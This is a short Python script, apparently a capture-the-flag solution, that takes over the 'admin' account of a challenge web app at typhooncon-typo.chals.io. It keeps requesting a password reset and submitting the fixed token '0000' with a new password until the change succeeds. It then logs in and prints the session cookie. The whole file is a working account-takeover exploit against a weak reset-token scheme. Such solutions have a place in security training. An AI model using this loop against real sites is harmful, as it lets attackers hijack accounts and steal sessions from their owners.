import requests

target = "https://typhooncon-typo.chals.io"
admin_pass = "satoki"

while True:
    try:
        res = requests.post(f"{target}/forgot.php", data={"uname": "admin"})
        print(res.text)
        res = requests.post(f"{target}/change.php", data={"uid": "1", "psw": admin_pass, "token": "0000"})
        print(res.text)
        if "Password Changed." in res.text:
            print("Hacked!!!!")
            print(f"admin password: {admin_pass}")
            res = requests.post(f"{target}/login.php", data={"uname": "admin", "psw": admin_pass, "remember": "on"})
            print(f"cookie: {res.cookies}")
            break
    except:
        pass